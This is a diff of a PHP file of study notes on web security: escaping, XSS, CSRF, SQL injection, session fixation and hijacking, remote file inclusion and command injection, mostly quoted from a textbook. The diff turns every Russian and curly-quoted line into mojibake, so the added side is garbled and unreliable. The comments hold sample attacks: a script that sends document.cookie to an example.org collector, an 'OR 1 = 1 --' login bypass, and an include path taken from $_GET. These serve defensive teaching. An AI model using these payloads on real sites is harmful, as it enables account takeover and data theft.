@@ -5,48 +5,48 @@
  *
  * @author Kudryashov Sergey iden.82@gmail.com
  */
-// Основные моменты по безопасности
+// РћСЃРЅРѕРІРЅС‹Рµ РјРѕРјРµРЅС‚С‹ РїРѕ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё
 //Escape Output:
-$user_message = 'Я вас щя взломаю! </table>';
+$user_message = 'РЇ РІР°СЃ С‰СЏ РІР·Р»РѕРјР°СЋ! </table>';
 htmlentities($user_message, ENT_QUOTES, 'UTF-8');
 
 // register_globals configuration directive automatically injects variables into scripts. 
 
 //A best practice for maintainable and manageable code is to use the appropriate su-
-//perglobal array for the location from which you expect the data to originate—$_GET,
+//perglobal array for the location from which you expect the data to originateвЂ”$_GET,
 //$_POST, or $_COOKIE.
 
-//Spoofed Forms - подделка форм. Не доверять юзер инпуту а лучше сверять идентификаторы
+//Spoofed Forms - РїРѕРґРґРµР»РєР° С„РѕСЂРј. РќРµ РґРѕРІРµСЂСЏС‚СЊ СЋР·РµСЂ РёРЅРїСѓС‚Сѓ Р° Р»СѓС‡С€Рµ СЃРІРµСЂСЏС‚СЊ РёРґРµРЅС‚РёС„РёРєР°С‚РѕСЂС‹
 
-//Cross-Site Scripting - размещение вред кода на ресурсах с целью умыкнуть данные юзера
-//Например вот так:
-//Imagine that a malicious user submits a comment on someone’s profile that contains
+//Cross-Site Scripting - СЂР°Р·РјРµС‰РµРЅРёРµ РІСЂРµРґ РєРѕРґР° РЅР° СЂРµСЃСѓСЂСЃР°С… СЃ С†РµР»СЊСЋ СѓРјС‹РєРЅСѓС‚СЊ РґР°РЅРЅС‹Рµ СЋР·РµСЂР°
+//РќР°РїСЂРёРјРµСЂ РІРѕС‚ С‚Р°Рє:
+//Imagine that a malicious user submits a comment on someoneвЂ™s profile that contains
 //the following content:
 //<script>
-//document.location = ’’http://example.org/getcookies.php?cookies=’’
+//document.location = вЂ™вЂ™http://example.org/getcookies.php?cookies=вЂ™вЂ™
 //+ document.cookie;
 //</script>
-//Now, everyone visiting this user’s profile will be redirected to the given URL and their
+//Now, everyone visiting this userвЂ™s profile will be redirected to the given URL and their
 //cookies (including any personally identifiable information and login information)
 //will be appended to the query string. The attacker can easily access the cookies with
-//$_GET[’cookies’] and store them for later use
+//$_GET[вЂ™cookiesвЂ™] and store them for later use
 
 
-//Cross-Site Request Forgeries  межсайтовая подделка запросов
-//Whereas an XSS attack exploits the user’s trust in an application, a forged request
-//exploits an application’s trust in a user, since the request appears to be legitimate
+//Cross-Site Request Forgeries  РјРµР¶СЃР°Р№С‚РѕРІР°СЏ РїРѕРґРґРµР»РєР° Р·Р°РїСЂРѕСЃРѕРІ
+//Whereas an XSS attack exploits the userвЂ™s trust in an application, a forged request
+//exploits an applicationвЂ™s trust in a user, since the request appears to be legitimate
 //and it is difficult for the application to determine whether the user intended for it to
 //take place.
 //Suppose you have a Web site in which users register for an account and then
 //browse a catalogue of books for purchase. Again, suppose that a malicious user signs
 //up for an account and proceeds through the process of purchasing a book from the
 //site. Along the way, she might learn the following through casual observation:
-//• She must log in to make a purchase.
-//• After selecting a book for purchase, she clicks the buy button, which redirects
+//вЂў She must log in to make a purchase.
+//вЂў After selecting a book for purchase, she clicks the buy button, which redirects
 //her through checkout.php.
-//• She sees that the action to checkout.php is a POST action but wonders whether
+//вЂў She sees that the action to checkout.php is a POST action but wonders whether
 //passing parameters to checkout.php through the query string (GET) will work.
-//• When passing the same form values through the query string (i.e.
+//вЂў When passing the same form values through the query string (i.e.
 //checkout.php?isbn=0312863551&qty=1), she notices that she has, in fact, suc-
 //cessfully purchased a book.
 //With this knowledge, the malicious user can cause others to make purchases at your
@@ -55,16 +55,16 @@ htmlentities($user_message, ENT_QUOTES, 'UTF-8');
 
 //SQL injection
 //SELECT * FROM users
-//WHERE username = ’username’ OR 1 = 1 --’ AND
-//password = ’d41d8cd98f00b204e9800998ecf8427e’
-//в итоге получим SELECT * FROM users
-//WHERE username = ’username’ OR 1 = 1 - и весь список пользователей
+//WHERE username = вЂ™usernameвЂ™ OR 1 = 1 --вЂ™ AND
+//password = вЂ™d41d8cd98f00b204e9800998ecf8427eвЂ™
+//РІ РёС‚РѕРіРµ РїРѕР»СѓС‡РёРј SELECT * FROM users
+//WHERE username = вЂ™usernameвЂ™ OR 1 = 1 - Рё РІРµСЃСЊ СЃРїРёСЃРѕРє РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№
 
-//session fixation - фиксация сессии
+//session fixation - С„РёРєСЃР°С†РёСЏ СЃРµСЃСЃРёРё
 //While the user accesses your site through this session, they may provide sensitive
 //information or even login credentials. If the user logs in while using the provided
-//session identifier, the attacker may be able to “ride” on the same session and gain
-//access to the user’s account.
+//session identifier, the attacker may be able to вЂњrideвЂќ on the same session and gain
+//access to the userвЂ™s account.
 // Solution:
 //session_start();
 //// If the user login is successful, regenerate the session ID
@@ -73,25 +73,25 @@ htmlentities($user_message, ENT_QUOTES, 'UTF-8');
 //session_regenerate_id();
 //}
 
-//session hihackig - угон сессии
-// то же самое - если злоумышленник увидит айди сессии и подделает ее
+//session hihackig - СѓРіРѕРЅ СЃРµСЃСЃРёРё
+// С‚Рѕ Р¶Рµ СЃР°РјРѕРµ - РµСЃР»Рё Р·Р»РѕСѓРјС‹С€Р»РµРЅРЅРёРє СѓРІРёРґРёС‚ Р°Р№РґРё СЃРµСЃСЃРёРё Рё РїРѕРґРґРµР»Р°РµС‚ РµРµ
 // If it has changed, then that is cause for concern, and the user should log in
 //again.
-//if ($_SESSION[’user_agent’] != $_SERVER[’HTTP_USER_AGENT’])
+//if ($_SESSION[вЂ™user_agentвЂ™] != $_SERVER[вЂ™HTTP_USER_AGENTвЂ™])
 //{
 //// Force user to log in again
 //exit;
 //}
 
 //Remote Code Injection
-// здесь все понятно.
-// include "{$_GET[’section’]}/data.inc.php"; -сюда вставить левые данные - и привет
-// Рецепт - не давать участвовать пользовательским данным в построении пути
-// также можно просто вырубить  allow_url_fopen - поставить ему Off
+// Р·РґРµСЃСЊ РІСЃРµ РїРѕРЅСЏС‚РЅРѕ.
+// include "{$_GET[вЂ™sectionвЂ™]}/data.inc.php"; -СЃСЋРґР° РІСЃС‚Р°РІРёС‚СЊ Р»РµРІС‹Рµ РґР°РЅРЅС‹Рµ - Рё РїСЂРёРІРµС‚
+// Р РµС†РµРїС‚ - РЅРµ РґР°РІР°С‚СЊ СѓС‡Р°СЃС‚РІРѕРІР°С‚СЊ РїРѕР»СЊР·РѕРІР°С‚РµР»СЊСЃРєРёРј РґР°РЅРЅС‹Рј РІ РїРѕСЃС‚СЂРѕРµРЅРёРё РїСѓС‚Рё
+// С‚Р°РєР¶Рµ РјРѕР¶РЅРѕ РїСЂРѕСЃС‚Рѕ РІС‹СЂСѓР±РёС‚СЊ  allow_url_fopen - РїРѕСЃС‚Р°РІРёС‚СЊ РµРјСѓ Off
 
 //Command Injection
-//у пользователя не должно быть возможности выполнять системные команты, например 
-// `` -> вот в этих кавычках. Опять же proper filtering and escaping 
+//Сѓ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РЅРµ РґРѕР»Р¶РЅРѕ Р±С‹С‚СЊ РІРѕР·РјРѕР¶РЅРѕСЃС‚Рё РІС‹РїРѕР»РЅСЏС‚СЊ СЃРёСЃС‚РµРјРЅС‹Рµ РєРѕРјР°РЅС‚С‹, РЅР°РїСЂРёРјРµСЂ 
+// `` -> РІРѕС‚ РІ СЌС‚РёС… РєР°РІС‹С‡РєР°С…. РћРїСЏС‚СЊ Р¶Рµ proper filtering and escaping 
 //Also, PHP provides escapeshellcmd() and escapeshellarg() as a
 //means to properly escape shell output.
 
